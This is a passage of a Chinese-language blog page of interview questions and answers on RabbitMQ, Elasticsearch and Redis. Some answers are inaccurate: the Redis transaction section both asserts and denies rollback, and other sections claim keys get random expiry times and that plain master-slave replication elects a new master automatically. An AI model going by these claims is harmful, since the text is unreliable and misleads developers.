会根据配置的重试策略进行多次重试。如果消息在经过多次重试后仍然无法被消费者处理，那么就会将该消息发送到死信队列中，以便后续进行处理。</li></ol><p>通过以上机制的配合，RabbitMQ 能够有效地处理消费者的异常退出，避免消息丢失的情况</p><h3 id="RabbitMQ-中如何处理死信队列？"><a href="#RabbitMQ-中如何处理死信队列？" class="headerlink" title="RabbitMQ 中如何处理死信队列？"></a>RabbitMQ 中如何处理死信队列？</h3><p>在 RabbitMQ 中，如果消息在经过多次重试后仍然无法被消费者处理，那么就会将该消息发送到死信队列中。为了处理死信队列，可以采取以下步骤：</p><ol><li>创建死信交换机和死信队列：首先需要创建一个死信交换机和一个死信队列。死信交换机用于接收被标记为死信的消息，并将其路由到死信队列中。死信队列用于存储死信消息，以便后续进行处理。</li><li>将队列绑定到死信交换机上：在创建普通队列时，需要将队列绑定到死信交换机上。这样，当消息被标记为死信时，就会被路由到死信队列中。</li><li>处理死信队列中的消息：在死信队列中的消息需要进行处理，可以采取以下几种方式：<ul><li>重新发送：将死信队列中的消息重新发送到原始队列中，让消费者重新尝试处理消息。</li><li>丢弃：直接从死信队列中删除消息。</li><li>转移：将死信队列中的消息转移到其他队列中，以便其他消费者处理。</li><li>记录日志：记录死信消息的信息，以便后续进行分析和处理。</li></ul></li></ol><p>通过以上步骤，可以有效地处理死信队列中的消息，提高消息的处理可靠性和稳定性。</p><h3 id="RabbitMQ-中如何实现延迟消息队列？"><a href="#RabbitMQ-中如何实现延迟消息队列？" class="headerlink" title="RabbitMQ 中如何实现延迟消息队列？"></a>RabbitMQ 中如何实现延迟消息队列？</h3><p>在 RabbitMQ 中，可以通过以下几种方式来实现延迟消息队列：</p><ol><li>使用 RabbitMQ 自带的插件：RabbitMQ 提供了一个名为“rabbitmq_delayed_message_exchange”的插件，可以用于实现延迟消息队列。该插件需要先安装和启用，然后创建一个带有该插件的延迟交换机，并将消息发送到该交换机上。在消息被路由到队列之前，可以通过消息头中的“x-delay”参数来指定消息的延迟时间，以实现延迟消息的发送。</li><li>使用 TTL 和死信队列：可以通过为消息设置TTL（Time To Live）属性，将其发送到一个带有死信队列的交换机上。当消息的TTL属性到期时，该消息会被发送到死信队列中，并且可以设置死信队列的TTL属性来实现延迟消息的发送。</li><li>使用定时器和延迟队列：可以使用定时器来定期检查消息队列中的消息，并将到期的消息发送到延迟队列中。在延迟队列中，可以为每个消息设置一个过期时间，并定期检查已过期的消息，将其发送到实际队列中。</li></ol><p>需要注意的是，以上方式都需要消费者能够及时地处理延迟消息，否则消息会一直停留在队列中，占用资源和空间。因此，在使用延迟消息队列时，需要仔细考虑消息的过期时间和消费者的处理能力，以确保系统的可靠性和稳定性。</p><h3 id="RabbitMQ-和-Kafka-有什么区别？"><a href="#RabbitMQ-和-Kafka-有什么区别？" class="headerlink" title="RabbitMQ 和 Kafka 有什么区别？"></a>RabbitMQ 和 Kafka 有什么区别？</h3><p>RabbitMQ 和 Kafka 都是常用的消息队列系统，它们有以下几个方面的不同：</p><ol><li>消息传递模型：RabbitMQ 是基于 AMQP 协议的消息队列系统，支持多种消息传递模式（如点对点、发布订阅、RPC等），适用于需要精确控制消息传递过程的场景。而 Kafka 则是一个分布式流式数据处理平台，支持消息发布订阅模式，适用于实时数据处理和分析场景。</li><li>性能和吞吐量：Kafka 在性能和吞吐量方面优于 RabbitMQ，因为 Kafka 的消息处理是基于批处理的，可以将多个消息一起处理，从而减少了网络传输和IO开销。而 RabbitMQ 需要使用者自己实现批处理。</li><li>可靠性和持久化：RabbitMQ 可以保证消息的可靠性和持久化，可以将消息写入磁盘，以便在出现故障时进行恢复。而 Kafka 也支持消息持久化，但在可靠性方面较 RabbitMQ 差一些，因为 Kafka 可能会出现消息丢失的情况。</li><li>部署和管理：RabbitMQ 的部署和管理相对简单，它可以通过简单的配置和管理界面进行部署和管理。而 Kafka 的部署和管理较为复杂，需要专门的管理和监控工具。</li></ol><p>总之，RabbitMQ 和 Kafka 适用于不同的场景。如果需要高性能、高吞吐量和实时数据处理能力，可以选择 Kafka；如果需要可靠性、持久化和灵活的消息传递模式，可以选择 RabbitMQ。</p><h3 id="—————————————————————————————————————————————————Es—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————Es—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————Es—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————Es—————————————————————————————————————————————————</h3><h3 id="Elasticsearch和数据库对应的结构"><a href="#Elasticsearch和数据库对应的结构" class="headerlink" title="Elasticsearch和数据库对应的结构"></a>Elasticsearch和数据库对应的结构</h3><p>当我们在Elasticsearch中定义索引映射(mapping)时，我们需要指定每个字段的数据类型。下面是一些Elasticsearch字段类型和它们在关系型数据库中的对应关系：</p><ul><li>text：类似于关系型数据库中的VARCHAR或TEXT类型，用于存储长文本。</li><li>keyword：类似于关系型数据库中的CHAR或ENUM类型，用于存储短文本或关键字。</li><li>integer：类似于关系型数据库中的INTEGER或BIGINT类型，用于存储整数值。</li><li>float：类似于关系型数据库中的FLOAT或DOUBLE类型，用于存储浮点数值。</li><li>date：类似于关系型数据库中的DATE或TIMESTAMP类型，用于存储日期和时间。</li><li>boolean：类似于关系型数据库中的BOOLEAN类型，用于存储布尔值。</li></ul><p>需要注意的是，Elasticsearch是一个文档型数据库，它存储的是JSON格式的文档，因此与传统的关系型数据库有很大的不同。在Elasticsearch中，每个文档都有一个唯一的ID，并且可以包含多个字段。每个字段都可以定义不同的数据类型，以适应不同的用例。</p><h3 id="什么是-Elasticsearch？"><a href="#什么是-Elasticsearch？" class="headerlink" title="什么是 Elasticsearch？"></a>什么是 Elasticsearch？</h3><p>Elasticsearch是一个开源的全文搜索和分析引擎，它使用Lucene作为底层引擎，提供了一个分布式、多租户、可扩展的搜索平台。Elasticsearch是一个实时搜索和分析引擎，支持全文搜索、结构化搜索、地理空间搜索、指标聚合等多种功能。它可以帮助用户快速地从大量的数据中找到所需信息，是企业级应用中常用的搜索引擎之一。</p><h3 id="Elasticsearch-的主要特点有哪些？"><a href="#Elasticsearch-的主要特点有哪些？" class="headerlink" title="Elasticsearch 的主要特点有哪些？"></a>Elasticsearch 的主要特点有哪些？</h3><p>Elasticsearch 的主要特点包括：</p><ol><li>分布式：Elasticsearch 采用分布式架构，数据可以水平扩展到多台服务器上。</li><li>高可用：Elasticsearch 采用主从复制机制，数据在多个节点之间复制，可以确保数据的可靠性和高可用性。</li><li>全文搜索：Elasticsearch 支持对大量文本数据进行全文搜索和分词，并提供了丰富的搜索和过滤功能。</li><li>多语言支持：Elasticsearch 支持多种语言的全文搜索和分词，包括中文、日文、韩文等等。</li><li>实时性：Elasticsearch 能够实时索引和查询数据，查询响应速度快。</li><li>易用性：Elasticsearch 提供了简单易用的 RESTful API，使开发者可以轻松地与之交互。</li><li>可扩展性：Elasticsearch 提供了插件机制，可以根据实际需求进行扩展。</li><li>开源：Elasticsearch 是开源软件，社区支持活跃，拥有丰富的文档和教程。</li></ol><h3 id="Elasticsearch-中的倒排索引是什么？"><a href="#Elasticsearch-中的倒排索引是什么？" class="headerlink" title="Elasticsearch 中的倒排索引是什么？"></a>Elasticsearch 中的倒排索引是什么？</h3><p>Elasticsearch 中的倒排索引（Inverted Index）是指一种数据结构，它将每个文档中出现的每个词（Term）与该文档的对应位置建立关联。在传统的索引中，我们需要遍历每个文档，找到其中包含查询词的文档，然后再去检索该文档。而倒排索引则是直接根据查询词去查找包含该词的文档，而不必遍历每个文档。</p><p>举个例子，如果我们要查找一个包含词语 “Elasticsearch is a search engine” 的文档，传统的索引需要遍历每个文档才能找到该文档，而倒排索引则直接查找包含 “Elasticsearch”、”is”、”a”、”search”、”engine” 的文档，并返回相应的位置信息。</p><p>倒排索引的优点在于它可以提高搜索效率，并支持在大量文档中进行全文搜索。在 Elasticsearch 中，倒排索引是一个核心概念，它被用于存储和搜索文档中的所有词汇信息。</p><h3 id="Elasticsearch-如何实现分布式搜索和聚合？"><a href="#Elasticsearch-如何实现分布式搜索和聚合？" class="headerlink" title="Elasticsearch 如何实现分布式搜索和聚合？"></a>Elasticsearch 如何实现分布式搜索和聚合？</h3><p>Elasticsearch 使用分布式架构来实现搜索和聚合。具体来说，它使用了以下几个机制来实现：</p><ol><li>分片：Elasticsearch 将索引分成多个片段，并将这些片段分配给不同的节点。这样可以将数据分散存储在不同的节点上，从而提高了性能和可伸缩性。</li><li>副本：Elasticsearch 可以将分片复制到不同的节点上，以提高数据的可用性和容错性。当主分片不可用时，副本分片可以被提升为主分片。</li><li>路由：当一个查询被发出时，Elasticsearch 会将查询路由到适当的分片。这通常涉及到将查询分发到所有分片，然后对结果进行汇总。</li><li>聚合：Elasticsearch 支持对分布式数据进行聚合计算，例如平均值、总和、最小值和最大值。它使用 MapReduce 的思想来实现分布式聚合。</li></ol><h3 id="Elasticsearch-中的集群是如何工作的？"><a href="#Elasticsearch-中的集群是如何工作的？" class="headerlink" title="Elasticsearch 中的集群是如何工作的？"></a>Elasticsearch 中的集群是如何工作的？</h3><p>Elasticsearch集群是由多个节点组成的，每个节点是一个单独的Elasticsearch实例。每个节点都可以处理数据，执行搜索和聚合操作，并维护自己的本地副本。集群中的每个节点都有自己的唯一名称，并且知道其他节点的名称和IP地址。</p><p>当一个请求到达Elasticsearch集群时，它会被发送到一个称为协调节点的节点。协调节点负责协调请求并将请求路由到适当的节点。协调节点维护一个集群状态，并跟踪哪些分片分配给了哪些节点。</p><p>当一个文档被索引时，它被分成若干个分片，然后分配给不同的节点进行处理。每个分片都有自己的副本，副本可以保证在节点故障时数据不会丢失。</p><p>在搜索和聚合操作中，请求被发送到协调节点。协调节点将请求路由到涉及到的所有分片，然后将结果汇总到单个响应中。这种方式使得Elasticsearch能够快速地进行分布式搜索和聚合操作，并支持大规模数据处理。</p><h3 id="Elasticsearch-中的索引是如何管理的？"><a href="#Elasticsearch-中的索引是如何管理的？" class="headerlink" title="Elasticsearch 中的索引是如何管理的？"></a>Elasticsearch 中的索引是如何管理的？</h3><p>在 Elasticsearch 中，索引用于组织和存储数据，类似于关系型数据库中的表。索引由一个或多个分片组成，每个分片都是一个 Lucene 索引。当一个文档被索引时，它会被分成多个分片，并分配给不同的节点进行处理。这样可以使得 Elasticsearch 在大规模数据量下仍然能够快速进行搜索和聚合操作。</p><p>在 Elasticsearch 中，索引的管理主要涉及以下方面：</p><ol><li>创建索引：可以通过 Elasticsearch 提供的 REST API 或者使用 Elasticsearch 客户端库来创建索引。</li><li>映射管理：在索引中定义文档的结构和字段类型。可以通过映射管理来指定文本字段使用的分词器、日期字段使用的日期格式等等。</li><li>索引别名管理：可以为一个索引创建多个别名，便于搜索和管理。</li><li>索引设置管理：包括索引的分片和副本数、分词器、过滤器等等。</li><li>索引优化：包括合并分段、刷新缓存、重建索引等操作，可以提高搜索和聚合的性能。</li></ol><p>总之，索引是 Elasticsearch 中最重要的组成部分之一，索引的管理可以对 Elasticsearch 的性能、可扩展性和可维护性产生重大影响。</p><h3 id="Elasticsearch-中如何实现数据备份和恢复？"><a href="#Elasticsearch-中如何实现数据备份和恢复？" class="headerlink" title="Elasticsearch 中如何实现数据备份和恢复？"></a>Elasticsearch 中如何实现数据备份和恢复？</h3><p>在Elasticsearch中，可以使用快照和恢复机制来进行数据备份和恢复。</p><p>快照是对整个集群或者单个索引的拍摄，包括所有的分片和副本，以及索引元数据和设置。可以将快照存储在本地磁盘上，也可以将其存储在远程共享文件系统上。快照可以使用Elasticsearch的API手动创建，也可以设置定时任务进行自动创建。</p><p>当需要恢复数据时，可以使用快照进行恢复。可以选择将整个集群或者单个索引恢复到之前拍摄的快照中的某个时间点。在恢复过程中，Elasticsearch会自动创建索引，并将分片和副本分配到可用的节点上。</p><p>值得注意的是，进行快照和恢复操作需要确保版本的兼容性。即快照和恢复的版本应该一致，否则可能会导致数据无法恢复或者出现其他问题。</p><h3 id="Elasticsearch-中如何处理查询性能问题？"><a href="#Elasticsearch-中如何处理查询性能问题？" class="headerlink" title="Elasticsearch 中如何处理查询性能问题？"></a>Elasticsearch 中如何处理查询性能问题？</h3><p>在 Elasticsearch 中，处理查询性能问题的一般步骤包括以下几点：</p><ol><li>优化查询语句：在编写查询语句时，应该尽量避免使用过于复杂的查询，可以采用缓存查询结果、复用查询等技术来减少查询的复杂度和耗时。</li><li>使用索引优化查询：使用合适的索引可以大大提升查询的性能。在 Elasticsearch 中，可以通过控制索引的数量、大小和分片等参数来优化查询性能。另外，使用合适的查询语法和查询参数也能够提高查询的效率。</li><li>调整硬件配置：对于大规模数据处理的场景，调整硬件配置可以有效提高查询性能。可以考虑增加服务器数量、扩容磁盘容量、增加内存容量等。</li><li>避免过度使用聚合操作：在 Elasticsearch 中，聚合操作是非常耗时的，尤其是在处理大数据量的情况下。因此，应该尽量避免过度使用聚合操作。</li><li>使用分布式搜索：Elasticsearch 支持分布式搜索，可以将搜索请求分散到多个节点上处理，从而提高搜索性能。如果数据量很大，可以考虑将索引分片，以便并行处理查询请求。</li></ol><p>综上所述，通过优化查询语句、使用索引、调整硬件配置、避免过度使用聚合操作和使用分布式搜索等方法，可以有效提高 Elasticsearch 的查询性能。</p><h3 id="Elasticsearch-中如何进行集群监控和管理？"><a href="#Elasticsearch-中如何进行集群监控和管理？" class="headerlink" title="Elasticsearch 中如何进行集群监控和管理？"></a>Elasticsearch 中如何进行集群监控和管理？</h3><p>Elasticsearch 提供了一系列工具和机制来监控和管理集群的健康状态和性能表现。</p><p>以下是一些常用的工具和机制：</p><ol><li>Elasticsearch Head 插件：这是一个基于 Web 的 Elasticsearch 集群管理工具，它提供了一个可视化界面，用于监控集群的健康状态、索引和节点信息等。</li><li>Kibana：这是一个基于 Web 的数据分析和可视化平台，它可以与 Elasticsearch 集成，用于实时监控和可视化 Elasticsearch 集群中的数据。</li><li>Elasticsearch 的 API：Elasticsearch 提供了一系列 RESTful API，可以用于管理和监控集群。例如，可以使用 _cluster/health API 获取集群的健康状态，使用 _cat API 获取节点和索引的统计信息等。</li><li>X-Pack：这是 Elasticsearch 官方提供的商业版插件，它提供了许多额外的功能，例如安全性、警报、监控、报告和机器学习等。</li><li>第三方监控工具：还可以使用一些第三方监控工具，例如 Prometheus 和 Grafana 等，它们可以通过 Elasticsearch 的 API 来监控 Elasticsearch 集群的状态和性能。</li></ol><p>总之，Elasticsearch 提供了多种方式来监控和管理集群的健康状态和性能表现。根据实际情况选择合适的工具和机制，可以更好地管理和维护 Elasticsearch 集群。</p><h3 id="Elasticsearch-与传统数据库的区别是什么？"><a href="#Elasticsearch-与传统数据库的区别是什么？" class="headerlink" title="Elasticsearch 与传统数据库的区别是什么？"></a>Elasticsearch 与传统数据库的区别是什么？</h3><p>Elasticsearch 和传统数据库在设计思路、数据存储方式、查询性能、数据分析等方面存在很大的区别。</p><ol><li>设计思路：Elasticsearch 是基于分布式搜索引擎 Lucene 构建的分布式搜索引擎，旨在快速、准确地进行全文搜索和实时数据分析。传统数据库则更加注重数据的事务性和一致性，面向业务应用。</li><li>数据存储方式：Elasticsearch 采用文档式存储方式，将数据存储为 JSON 格式的文档，文档包含多个字段，每个字段都可以被索引和搜索。而传统数据库采用关系型模型，将数据存储在多个表中，需要进行关联查询。</li><li>查询性能：Elasticsearch 可以实现非常高效的全文搜索和聚合查询，支持分词、模糊匹配、多条件查询、过滤查询等复杂查询，而传统数据库的查询性能则主要受限于表结构、索引和数据量的大小。</li><li>数据分析：Elasticsearch 支持对实时数据进行实时分析，可以对海量数据进行快速聚合和分析，而传统数据库则需要进行离线的数据汇总和分析。</li></ol><p>综上所述，Elasticsearch 和传统数据库在数据存储方式、查询性能和数据分析等方面存在很大的差异，适用于不同的业务场景。</p><h3 id="—————————————————————————————————————————————————Redis—————————————————————————————————————————————————"><a href="#—————————————————————————————————————————————————Redis—————————————————————————————————————————————————" class="headerlink" title="—————————————————————————————————————————————————Redis—————————————————————————————————————————————————"></a>—————————————————————————————————————————————————Redis—————————————————————————————————————————————————</h3><h3 id="什么是-Redis？Redis-的优点和缺点是什么？"><a href="#什么是-Redis？Redis-的优点和缺点是什么？" class="headerlink" title="什么是 Redis？Redis 的优点和缺点是什么？"></a>什么是 Redis？Redis 的优点和缺点是什么？</h3><p>Redis（Remote Dictionary Server）是一个开源的内存数据存储系统，它提供了高效的键值对数据存储和访问，支持多种数据结构（如字符串、哈希、列表、集合、有序集合等），具有快速、高效、灵活和可扩展的特点，被广泛应用于缓存、消息队列、分布式锁、计数器、数据持久化、实时数据处理等领域。</p><p>Redis 的优点：</p><ol><li>高性能：Redis 的数据存储在内存中，读写速度非常快，特别适合处理大量的高并发请求。</li><li>多种数据类型：Redis 支持多种数据结构，如字符串、哈希、列表、集合、有序集合等，能够满足不同场景下的数据存储需求。</li><li>持久化支持：Redis 支持两种持久化方式，RDB 和 AOF，可以将数据写入磁盘，以便在服务器重启后进行恢复。</li><li>分布式支持：Redis 提供了多种分布式方案，如主从复制、哨兵模式和集群模式等，可以提高系统的可用性和可扩展性。</li><li>丰富的特性：Redis 还提供了诸如 Lua 脚本、事务、过期时间、发布订阅等高级特性，可以帮助开发人员更好地处理数据。</li></ol><p>Redis 的缺点：</p><ol><li>内存限制：Redis 的数据存储在内存中，如果存储的数据量过大，可能会导致内存不足。</li><li>单线程模型：Redis 的主线程是单线程的，可能会存在性能瓶颈。</li><li>数据持久化写入磁盘效率不高：Redis 的持久化写入磁盘的效率不如直接写入内存。</li><li>不支持事务的回滚：Redis 支持事务，但不支持回滚操作。</li></ol><p>总之，Redis 是一款高性能、多功能、可扩展的内存数据存储系统，具有诸多优点和一些缺点，需要根据实际需求和场景进行使用和调优。</p><h3 id="Redis-支持哪些数据类型？各自的应用场景是什么？"><a href="#Redis-支持哪些数据类型？各自的应用场景是什么？" class="headerlink" title="Redis 支持哪些数据类型？各自的应用场景是什么？"></a>Redis 支持哪些数据类型？各自的应用场景是什么？</h3><p>Redis 支持多种数据类型，每种数据类型都有其独特的应用场景，以下是 Redis 支持的数据类型及其应用场景：</p><ol><li>字符串（String）：用于存储字符串、整数、浮点数等简单数据类型，适用于缓存、计数器、计时器等场景。</li><li>哈希（Hash）：用于存储对象，类似于关系型数据库中的表，适用于存储用户信息、商品信息等对象数据。</li><li>列表（List）：用于存储一系列有序元素，支持从列表两端添加、弹出元素，适用于消息队列、任务队列等场景。</li><li>集合（Set）：用于存储一组无序、唯一的元素，支持交、并、差等集合运算，适用于好友列表、标签系统等场景。</li><li>有序集合（Sorted Set）：在集合的基础上，为每个元素分配一个分数，支持按照分数排序和范围查询，适用于排行榜、计数器、地理位置等场景。</li></ol><p>每种数据类型都有其特定的数据结构和命令，Redis 提供了丰富的数据操作命令和高级特性，可以帮助开发人员更好地处理数据，提高系统的性能和可扩展性。</p><h3 id="Redis-的持久化机制有哪些？它们有什么区别？"><a href="#Redis-的持久化机制有哪些？它们有什么区别？" class="headerlink" title="Redis 的持久化机制有哪些？它们有什么区别？"></a>Redis 的持久化机制有哪些？它们有什么区别？</h3><p>Redis 提供了两种持久化机制，分别是 RDB 持久化和 AOF 持久化。</p><ol><li>RDB 持久化：Redis 在指定的时间间隔内将内存中的数据快照写入磁盘，形成一个 RDB 文件，恢复时将 RDB 文件读入内存即可。RDB 持久化的优点是占用磁盘空间小，恢复速度快；缺点是可能会丢失最后一次持久化之后的数据。</li><li>AOF 持久化：Redis 将写命令追加到 AOF 文件中，恢复时将 AOF 文件重新执行一遍即可。AOF 持久化的优点是可以保证数据完整性，因为所有写命令都被记录下来；缺点是文件较大，恢复速度相对较慢。</li></ol><p>两种持久化机制可以结合使用，通过 AOF 持久化保证数据完整性，使用 RDB 持久化进行备份和恢复。在实际使用中，需要根据数据量、系统性能和恢复速度等因素选择合适的持久化机制和参数配置。</p><h3 id="Redis-的过期策略是什么？如何实现定期清理过期键？"><a href="#Redis-的过期策略是什么？如何实现定期清理过期键？" class="headerlink" title="Redis 的过期策略是什么？如何实现定期清理过期键？"></a>Redis 的过期策略是什么？如何实现定期清理过期键？</h3><p>Redis 的过期策略是基于惰性删除和定期删除相结合的方式。</p><p>当一个键过期时，Redis 并不会立即删除它，而是在客户端尝试读取该键时才会检测该键是否过期，如果过期则删除。这种方式称为惰性删除，它的优点是可以减少删除操作的开销和系统负载。</p><p>另外，Redis 会定期扫描一定数量的数据库键，删除其中已过期的键，这种方式称为定期删除。Redis 通过配置 <code>hz</code> 参数来控制每秒执行定期删除操作的次数，默认为 10 次。同时，Redis 还会为每个键设置一个随机的过期时间，防止过多的键同时到达过期时间导致大量的定期删除操作。</p><p>实现定期清理过期键的过程由 Redis 的服务器进程自动完成，其具体实现是通过 Redis 内部的定时器来触发定期删除操作。每次定期删除操作会扫描一定数量的过期键，并将它们从数据库中删除。</p><p>需要注意的是，定期删除操作不一定会及时清理过期键，因此在某些情况下，即使一个键已过期，它仍然可能存在于数据库中。如果需要确保过期键能够及时清理，可以将过期时间设置为较短的时间，并调整 Redis 的定期删除参数来加速清理过期键。</p><h3 id="Redis-支持分布式吗？如何实现分布式？"><a href="#Redis-支持分布式吗？如何实现分布式？" class="headerlink" title="Redis 支持分布式吗？如何实现分布式？"></a>Redis 支持分布式吗？如何实现分布式？</h3><p>是的，Redis 支持分布式，可以通过 Redis Cluster 或者 Redis Sentinel 实现分布式。</p><ol><li>Redis Cluster</li></ol><p>Redis Cluster 是 Redis 的分布式解决方案，它将多个 Redis 节点组成一个集群，提供了数据分片和高可用性等功能。Redis Cluster 使用哈希槽的方式来对数据进行分片，并使用 Gossip 协议来实现节点间的信息传递和故障检测。当一个节点宕机时，集群会自动将该节点的哈希槽迁移到其他节点上。</p><ol><li>Redis Sentinel</li></ol><p>Redis Sentinel 是 Redis 的高可用性解决方案，它通过监控 Redis 节点的运行状态来实现自动故障转移和自动恢复。Redis Sentinel 由多个 Sentinel 节点组成，每个 Sentinel 节点会周期性地检测 Redis 节点的状态，并将状态信息广播给其他 Sentinel 节点。当一个 Redis 节点宕机时，Sentinel 会自动将该节点的服务迁移到其他可用节点上。</p><p>实现分布式的具体步骤如下：</p><ol><li>安装 Redis Cluster 或者 Redis Sentinel。</li><li>配置 Redis 节点，并启动 Redis 服务。</li><li>在 Redis 配置文件中指定集群的名称、节点 IP 地址、端口号等信息。</li><li>创建 Redis 集群或者 Sentinel 集群。</li><li>对于 Redis Cluster，使用命令 <code>CLUSTER MEET</code> 将节点加入集群；使用命令 <code>CLUSTER ADDSLOTS</code> 将哈希槽分配给节点。</li><li>对于 Redis Sentinel，使用命令 <code>SENTINEL MONITOR</code> 将节点加入 Sentinel 集群；使用命令 <code>SENTINEL SET</code> 设置监控的 Redis 实例地址和端口号。</li><li>测试分布式集群的功能和性能。</li></ol><p>需要注意的是，在使用 Redis Cluster 或者 Redis Sentinel 时，应该注意配置节点数量和复制因子等参数，以保证数据分片和高可用性的可靠性和性能。</p><h3 id="Redis-的主从复制和哨兵模式有什么区别？如何实现高可用？"><a href="#Redis-的主从复制和哨兵模式有什么区别？如何实现高可用？" class="headerlink" title="Redis 的主从复制和哨兵模式有什么区别？如何实现高可用？"></a>Redis 的主从复制和哨兵模式有什么区别？如何实现高可用？</h3><p>Redis 的主从复制和哨兵模式都是 Redis 高可用性的解决方案，但它们的实现方式和应用场景有所不同。</p><ol><li>主从复制</li></ol><p>主从复制是 Redis 的一种数据复制方式，通过将一个 Redis 节点（主节点）的数据复制到其他多个 Redis 节点（从节点）上，实现数据的备份和读写分离。主节点负责接收和处理客户端请求，从节点复制主节点的数据，并提供只读访问。</p><p>在主从复制中，当主节点宕机或者网络中断时，Redis 会选举一个新的主节点来替代原来的主节点，继续提供服务。主从复制的优点是实现简单，适用于数据量不大、读写比例不高的场景。</p><ol><li>哨兵模式</li></ol><p>哨兵模式是 Redis 的另一种高可用性解决方案，通过引入多个哨兵节点来监控 Redis 的运行状态，实现自动故障转移和自动恢复。哨兵节点负责检测 Redis 节点的状态，并在主节点宕机或者网络中断时，自动将从节点提升为新的主节点，继续提供服务。</p><p>哨兵模式的优点是实现灵活，可以动态添加和删除节点，并且可以根据实际情况调整故障转移和恢复的参数。哨兵模式适用于数据量较大、读写比例较高、需要实现高可用性和动态扩展的场景。</p><p>实现高可用性的具体步骤如下：</p><ol><li>配置主从复制或者哨兵模式，并启动 Redis 服务。</li><li>配置 Redis 的节点信息、复制因子、监控参数等。</li><li>测试 Redis 的读写性能和数据一致性。</li><li>在哨兵模式下，启动 Sentinel 节点，监控 Redis 的运行状态，并在主节点宕机时，自动完成故障转移和恢复操作。</li></ol><p>需要注意的是，在使用 Redis 主从复制或者哨兵模式时，应该注意节点数量和复制因子等参数，以保证数据一致性和高可用性的可靠性和性能。同时，也需要定期备份和监控 Redis 的数据和运行状态，以便及时发现和处理问题。</p><h3 id="Redis-的并发竞争问题如何解决？"><a href="#Redis-的并发竞争问题如何解决？" class="headerlink" title="Redis 的并发竞争问题如何解决？"></a>Redis 的并发竞争问题如何解决？</h3><p>在 Redis 中，可以通过以下几种方式来解决并发竞争问题：</p><ol><li>使用 Redis 事务机制</li></ol><p>Redis 支持类似数据库的事务机制，可以通过 MULTI、EXEC、WATCH 等命令来实现。在事务中，可以将多个 Redis 命令作为一个整体进行提交，从而保证了这些命令的原子性和一致性。</p><p>在并发环境下，可以使用 Redis 事务机制来保证数据的一致性和避免竞争问题。例如，在对某个键值进行修改时，可以先使用 WATCH 命令监控该键值，然后再使用 MULTI 和 EXEC 命令将修改操作包含在一个事务中进行提交。</p><ol><li>使用 Redis 分布式锁</li></ol><p>Redis 还支持分布式锁机制，可以通过 SETNX、GETSET、EXPIRE 等命令来实现。在分布式环境下，可以使用 Redis 分布式锁来保证资源的独占性和避免竞争问题。例如，在对某个资源进行修改时，可以先获取该资源的锁，然后再进行修改操作，最后释放锁。</p><p>需要注意的是，在使用 Redis 分布式锁时，需要考虑锁的粒度和锁的持有时间等参数，以避免锁的争夺和死锁等问题。</p><ol><li>使用 Redis Lua 脚本</li></ol><p>Redis 还支持 Lua 脚本语言，可以通过 EVAL、EVALSHA 等命令来执行 Lua 脚本。在并发环境下，可以使用 Redis Lua 脚本来实现复杂的操作，并且保证这些操作的原子性和一致性。</p><p>例如，在对某个键值进行修改时，可以使用 Redis Lua 脚本来实现自增、自减、加锁等操作，从而避免竞争问题和数据不一致问题。</p><p>需要注意的是，在使用 Redis Lua 脚本时，需要考虑脚本的性能和安全性等因素，避免出现性能瓶颈和安全漏洞等问题。</p><h3 id="Redis-的事务和乐观锁如何实现？有什么注意点？"><a href="#Redis-的事务和乐观锁如何实现？有什么注意点？" class="headerlink" title="Redis 的事务和乐观锁如何实现？有什么注意点？"></a>Redis 的事务和乐观锁如何实现？有什么注意点？</h3><p>Redis 中的事务和乐观锁可以通过 MULTI、EXEC、WATCH、UNWATCH 等命令来实现。</p><ol><li>Redis 事务</li></ol><p>Redis 中的事务是基于乐观锁实现的，具体的操作流程如下：</p><ul><li>使用 MULTI 命令开启事务。</li><li>在事务中执行多个 Redis 命令。</li><li>使用 EXEC 命令提交事务，Redis 会将事务中的所有命令一次性执行。</li><li>如果事务中有任何一条命令执行失败，整个事务都会被回滚。</li></ul><p>需要注意的是，Redis 的事务不支持回滚操作，如果在事务中出现了错误，整个事务都会被回滚，无法保留已经执行成功的命令。</p><ol><li>Redis 乐观锁</li></ol><p>Redis 的乐观锁机制是基于 WATCH 命令实现的。当一个键被 WATCH 之后，如果该键的值发生了变化，整个事务就会被回滚。具体的操作流程如下：</p><ul><li>使用 WATCH 命令监视一个或多个键。</li><li>开启事务，执行多个 Redis 命令。</li><li>如果监视的键没有被修改，提交事务，Redis 会将事务中的所有命令一次性执行。</li><li>如果监视的键被修改，事务会被回滚。</li></ul><p>需要注意的是，在使用 Redis 的事务和乐观锁时，需要考虑以下几个注意点：</p><ul><li>Redis 的事务和乐观锁都是基于单线程执行的，如果事务中的命令比较多或者执行时间比较长，可能会阻塞其他客户端的请求。</li><li>Redis 的事务和乐观锁只能保证事务中的操作是原子的，无法保证事务之间的隔离性和并发性。</li><li>Redis 的事务和乐观锁都是基于内存实现的，如果 Redis 实例重启或崩溃，可能会丢失部分或全部数据。</li><li>Redis 的 WATCH 命令的性能比较低，如果需要监视的键比较多或者频繁修改，可能会影响性能。</li></ul><h3 id="Redis-的内存淘汰策略有哪些？如何选择合适的策略？"><a href="#Redis-的内存淘汰策略有哪些？如何选择合适的策略？" class="headerlink" title="Redis 的内存淘汰策略有哪些？如何选择合适的策略？"></a>Redis 的内存淘汰策略有哪些？如何选择合适的策略？</h3><p>Redis 的内存淘汰策略有以下几种：</p><ol><li>noeviction</li></ol><p>当 Redis 内存满了之后，不再接受新的写入请求，直接返回错误信息给客户端。</p><ol><li>allkeys-lru</li></ol><p>当 Redis 内存满了之后，从所有的键中选择最近最少使用的数据进行淘汰。</p><ol><li>allkeys-random</li></ol><p>当 Redis 内存满了之后，随机选择一个键进行淘汰。</p><ol><li>volatile-lru</li></ol><p>当 Redis 内存满了之后，从设置了过期时间的键中选择最近最少使用的数据进行淘汰。</p><ol><li>volatile-random</li></ol><p>当 Redis 内存满了之后，从设置了过期时间的键中随机选择一个键进行淘汰。</p><ol><li>volatile-ttl</li></ol><p>当 Redis 内存满了之后，从设置了过期时间的键中选择剩余时间最短的数据进行淘汰。</p><p>选择合适的内存淘汰策略需要根据具体的应用场景来定，一般情况下可以考虑以下几个因素：</p><ol><li>缓存的数据类型和访问模式</li></ol><p>对于一些经常被访问的热点数据，可以选择 allkeys-lru 或 volatile-lru 策略，以保证这些数据的可用性。</p><ol><li>缓存数据的更新频率和过期时间</li></ol><p>对于更新频率较低的数据，可以选择 allkeys-random 或 volatile-random 